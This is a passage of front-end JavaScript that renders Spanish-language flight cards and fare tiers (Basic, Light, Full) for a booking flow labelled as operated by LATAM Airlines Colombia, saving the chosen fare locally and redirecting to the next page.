                                            <svg class="tc-red" width="15px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M17.4014 18.8028H14.5986V7.59158H17.4014V18.8028ZM17.4014 24.4084H14.5986V21.6056H17.4014V24.4084ZM16 2C8.26427 2 2 8.27827 2 16C2 23.7217 8.27829 30 16 30C23.7217 30 30 23.7217 30 16C30 8.27827 23.7217 2 16 2Z" fill="currentColor"></path></svg>
                                            <span class="ml-1 fs-5 tc-gray-smoke">No aplican beneficios por categorías de socios</span>
                                        </div>
                                    </div>
                                    <div class="d-flex flex-column align-items-center">
                                        <p class="fs-3 fw-bolder tc-ocean m-0">COP ${PRECIO_BASE.toLocaleString('es-Es')},00</p>
                                        <p class="fs-5 mt-0 mb-5 tc-gray-smoke">Por pasajero</p>
                                        <a class="fw-lighter tc-blue mt-4" href="">Más detalles</a>
                                    </div>

                                    <div class="pl-3 pr-3 mt-3 mb-2" onclick="UIFlights.setFlight('basic', ${i})">
                                        <button class="btn-select-flight" id="btn-basic">
                                            Elegir
                                        </button>
                                    </div>
                                </div>

                                <div id="light-seat">
                                    <p class="fw-bolder fs-3 ml-3 mt-4">Light</p>
                                    <div class="container-seat-options p-3">
                                        <div class="d-flex align-items-start mb-2">
                                            <svg class="tc-light-green" width="15px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"></path></svg>
                                            <span class="ml-1 fs-5 tc-gray-smoke">Bolso o mochila pequeña</span>
                                        </div>
                                        <div class="d-flex align-items-start mb-2">
                                            <svg class="tc-light-green" width="15px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"></path></svg>
                                            <span class="ml-1 fs-5 tc-gray-smoke">Equipaje de mano 10 kg</span>
                                        </div>
                                        <div class="d-flex align-items-start mb-2">
                                            <svg class="tc-light-green" width="15px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"></path></svg>
                                            <span class="ml-1 fs-5 tc-gray-smoke">Cambio con cargo</span>
                                        </div>
                                        <div class="d-flex align-items-start mb-2">
                                            <svg class="tc-light-green" width="15px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"></path></svg>
                                            <span class="ml-1 fs-5 tc-gray-smoke">Postulación a UPG con tramos</span>
                                        </div>
                                    </div>
                                    <div class="d-flex flex-column align-items-center">
                                        <p class="fs-3 fw-bolder tc-ocean m-0">COP ${(Math.ceil(PRECIO_BASE*1.7)).toLocaleString('es-Es')},00</p>
                                        <p class="fs-5 mt-0 mb-5 tc-gray-smoke">Por pasajero</p>
                                        <a class="fw-lighter tc-blue mt-4" href="">Más detalles</a>
                                    </div>

                                    <div class="pl-3 pr-3 mt-3 mb-2" onclick="UIFlights.setFlight('light', ${i})">
                                        <button class="btn-select-flight" id="btn-light">
                                            Elegir
                                        </button>
                                    </div>
                                </div>

                                <div id="full-seat">
                                    <p class="fw-bolder fs-3 ml-3 mt-4">Full</p>
                                    <div class="container-seat-options p-3">
                                        <div class="d-flex align-items-start mb-2">
                                            <svg class="tc-light-green" width="15px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"></path></svg>
                                            <span class="ml-1 fs-5 tc-gray-smoke">Bolso o mochila pequeña</span>
                                        </div>
                                        <div class="d-flex align-items-start mb-2">
                                            <svg class="tc-light-green" width="15px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"></path></svg>
                                            <span class="ml-1 fs-5 tc-gray-smoke">Equipaje de mano 10 kg</span>
                                        </div>
                                        <div class="d-flex align-items-start mb-2">
                                            <svg class="tc-light-green" width="15px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"></path></svg>
                                            <span class="ml-1 fs-5 tc-gray-smoke">1 equipaje de bodega 23 kg</span>
                                        </div>
                                        <div class="d-flex align-items-start mb-2">
                                            <svg class="tc-light-green" width="15px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"></path></svg>
                                            <span class="ml-1 fs-5 tc-gray-smoke">Cambio sin cargo</span>
                                        </div>
                                        <div class="d-flex align-items-start mb-2">
                                            <svg class="tc-light-green" width="15px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"></path></svg>
                                            <span class="ml-1 fs-5 tc-gray-smoke">Selección de asiento</span>
                                        </div>
                                        <div class="d-flex align-items-start mb-2">
                                            <svg class="tc-light-green" width="15px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"></path></svg>
                                            <span class="ml-1 fs-5 tc-gray-smoke">Devolución total</span>
                                        </div>
                                        <div class="d-flex align-items-start mb-2">
                                            <svg class="tc-light-green" width="15px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"></path></svg>
                                            <span class="ml-1 fs-5 tc-gray-smoke">Postulación a UPG con tramos</span>
                                        </div>
                                    </div>
                                    <div class="d-flex flex-column align-items-center">
                                        <p class="fs-3 fw-bolder tc-ocean m-0">COP ${(Math.ceil(PRECIO_BASE*3)).toLocaleString('es-Es')},00</p>
                                        <p class="fs-5 mt-0 mb-5 tc-gray-smoke">Por pasajero</p>
                                        <a class="fw-lighter tc-blue mt-4" href="">Más detalles</a>
                                    </div>

                                    <div class="pl-3 pr-3 mt-3 mb-2" onclick="UIFlights.setFlight('full', ${i})">
                                        <button class="btn-select-flight" id="btn-full">
                                            Elegir
                                        </button>
                                    </div>
                                </div>

                                </div>
                            </div>
                        </div>
                    </div>
                `
                i++;
            }else{
                this.flightsDiv.innerHTML += `
                    <div class="card-flight p-3 mb-3">
                        <span class="card-flight-label">Más económico</span>
            
                        <div id="${i}" class="d-flex justify-space-between border-bottom mt-3" onclick="UIFlights.showFlightsDetails(${i})">
                            <div>
                                <p class="m-0 fs-2 tc-ocean">${config.takeoff}</p>
                                <p class="m-0 fs-4">${info.flightInfo.origin.code}</p>
                            </div>
                            <div class="d-flex align-items-end flex-column">
                                <p class=" mt-0 mb-1 fs-6 tc-gray-smoke">Duración</p>
                                <p class="fs-6 mt-0">${config.duration}</p>
                            </div>
                            <div class="d-flex align-items-end flex-column">
                                <p class="m-0 fs-2 tc-ocean">${config.landing}</p>
                                <p class="m-0 fs-4">${info.flightInfo.destination.code}</p>
                            </div>
                        </div>
            
                        <div class="d-flex justify-space-between mt-3">
                            <div class="d-flex align-items-center">
                                <a class="fw-bolder tc-blue" href="">Directo</a>
                            </div>
                            <div class="d-flex align-items-end flex-column">
                                <p class="m-1 fs-6 tc-green">Adulto desde</p>
                                <p class="m-0 fs-4 tc-deep-blue">COP ${PRECIO_BASE.toLocaleString('es-Es')},00</p>
                            </div>
                        </div>
            
                        <p class="tc-gray-smoke fs-6 mb-0">Operado por LATAM Airlines Colombia</p>
                    </div>
                `;
                i++;
            }
        });

    }

    static setFlight(flight_type, flight_id){
        document.querySelector(`#btn-${flight_type}`).innerHTML = `<span class="loader"></span>`;
        info.flightInfo.origin.ticket_type = flight_type;
        info.flightInfo.origin.ticket_sched = this.flightsConfig[0][flight_id];
        updateLS();

        setTimeout(() =>{
            if(info.flightInfo.travel_type === 1){
                window.location.href = 'select-flight-back.html';
            }else if(info.flightInfo.travel_type === 2){
                window.location.href = 'flight-resume.html';
            }
        }, 2500);
    }
}




/**
 * Utils
 * 
 */